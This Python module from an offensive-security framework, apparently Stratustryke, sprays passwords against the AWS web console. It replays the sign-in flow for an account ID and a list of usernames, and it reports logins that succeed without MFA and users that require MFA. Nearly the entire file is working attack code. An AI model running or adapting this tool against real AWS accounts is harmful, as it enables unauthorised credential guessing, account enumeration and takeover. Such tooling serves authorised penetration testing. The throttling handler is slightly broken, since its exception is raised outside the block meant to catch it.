from stratustryke.core.module import StratustrykeModule
from pathlib import Path
from requests import Session
from stratustryke.core.lib import StratustrykeException
from urllib.parse import urlparse, parse_qs, quote_plus
from json import loads
import time

class ThrottlingException(Exception):
    pass

class Module(StratustrykeModule):
    def __init__(self, framework) -> None:
        super().__init__(framework)

        self._info = {
            'Authors': ['@vexance'],
            'Description': 'Perform login attempt against AWS web console as an IAM user',
            'Details': 'Given a user or list of usernames, attempt to login in with the provided password. This can be used to identify username and password combinations for users without MFA configured, or in the case of a user with MFA configured, the principle name of a user within the account. Each logon attempt will be logged to the targetted account\'s cloudtrail logs.',
            'References': ['']
        }

        self._options.add_string('ACCOUNT_ID', 'Target AWS account to authenticate against', True, regex='^[0-9]{12}$')
        self._options.add_string('USERNAME', 'Username supplied in the login attempt (Supports file: prefix)', True)
        self._options.add_string('PASSWORD', 'Password to use for attempted authentication.', True, sensitive=True)
        self._options.add_integer('DELAY', 'Time in seconds to wait between requests', False, 0)

    @property
    def search_name(self) -> str:
        return f'aws/util/{self.name}'

    def validate_options(self) -> tuple:
        valid, msg = super().validate_options()
        if not valid:
            return (False, msg)

        user = self.get_opt('USERNAME')
        filename = user[5:] if user.startswith('file:') else None
        if filename != None:
            if not (Path(filename).exists() and Path(filename).is_file()):
                return (False, f'Cannot find username file \'{filename}\'')

        return (valid, None)


    def attempt_login(self, user: str, pwd: str) -> tuple[int, dict | None]:
        '''Perform a login attempt against the AWS web console'''
        acc_id = self.get_opt('ACCOUNT_ID')
        session = Session()

        try:
            session.headers['User-Agent'] = 'Stratustryke - Python Requests Library' # Identify our traffic in user-agent
            res = session.get(f'https://{acc_id}.signin.aws.amazon.com/console') # Step 1: Navigate to the account's signin URL
            
            res = session.get('https://console.aws.amazon.com/console/home?hashArgs=#', allow_redirects=False) # Step 2: Get the correct redirect_uri 
            redirect = res.headers.get('Location', None)
            if redirect == None: raise StratustrykeException(f'Error - redirect_uri not found for {user}:{pwd}')

            # Parse redirect URI for the challenge & type
            parsed = urlparse(redirect)
            challenge = parse_qs(parsed.query)['code_challenge'][0]
            method = parse_qs(parsed.query)['code_challenge_method'][0]

            res = session.get(redirect) # Step 3: Make the request to the redirect

            # Step 4: Prepare final request headers sent in normal request flow
            session.headers['Content-Type'] = 'application/x-www-form-urlencoded;charset=utf-8'
            session.headers['Referer'] = quote_plus(redirect)
            session.headers['Origin'] = 'https://signin.aws.amazon.com'
            session.headers['Sec-Fetch-Dest'] = 'empty'
            session.headers['Sec-Fetch-Mode'] = 'cors'
            session.headers['Sec-Fetch-Site'] = 'same-origin'
            session.headers['Sec-Gpc'] = '1'
            session.headers['Dnt'] = '1'
            session.headers['Te'] = 'trailers'

            # Step 5: Prepare form data fields
            formdata = {
                'client_id': 'arn:aws:signin:::console/canvas',
                'action': 'iam-user-authentication',
                'account': acc_id,
                'username': user,
                'password': pwd,
                'redirect_uri': 'https://console.aws.amazon.com/console/home',
                'metadata1' : '',
                'code_challenge': challenge,
                'code_challenge_method': method,
                'rememberAccount': 'false'
            }

            # Step 6: POST logon attempt

            res = session.post('https://signin.aws.amazon.com/authenticate', data=formdata)
            
            res_data = loads(res.text)

            if not (res.status_code and res_data):
                raise StratustrykeException(f'Error - invalid authentication response for {user}:{pwd}')
        
        except Exception as err:
            self.framework.print_error(f'{err}')
            return (-1, None)

        return res.status_code, res_data


    def password_spray(self, users: list, pwd: str) -> list:
        '''Attempt password spraying attack against AWS web console, return list of potentially throttled users'''
        delay = self.get_opt('DELAY')
        
        throttled = []
        for user in users:
            status, res = self.attempt_login(user, pwd)
            if (status == -1 or res == None):
                time.sleep(delay)
                continue

            if status == 429: raise ThrottlingException()

            try:
                state = res.get('state', None)
                if state == None: raise StratustrykeException(f'Error Invalid response state for {user}:{pwd}')

                if state == 'FAIL':
                    self.framework.print_failure(f'Invalid login - {user}:{pwd}')
                
                elif (state == 'SUCCESS'):
                    result = res.get('properties', {}).get('result', None)
                    if result == None: raise StratustrykeException(f'Error - invalid response result for {user}:{pwd}')

                    if result == 'SUCCESS':
                        self.framework.print_success(f'Successful login without MFA - {user}:{pwd}')

                    elif result == 'MFA':
                        mfatype = res.get('properties', {}).get('mfaType', 'Unknown')
                        self.framework.print_failure(f'MFA ({mfatype}) required for user - {user}')

            except ThrottlingException:
                self.framework.print_status(f'Potential throttling detected on {user}, sleeping 5 seconds...')
                throttled.append(user)
                time.sleep(5)

            except Exception as err:
                self.framework.print_error(f'{err}')
            
            time.sleep(delay)

        return throttled


    def run(self):
        uname = self.get_opt('USERNAME')
        passwd = self.get_opt('PASSWORD')
        delay = self.get_opt('DELAY')

        if uname.startswith('file:'):
            usernames = self.load_strings(uname[5:])
        else: usernames = [uname]

        self.framework.print_status(f'Spraying against {len(usernames)} potential users')

        throttled = self.password_spray(usernames, passwd)

        if len(throttled) > 0:
            self.framework.print_status(f'Re-trying login for {len(throttled)} potentially throttled requests')
            self.password_spray(throttled, passwd)
        

        

        



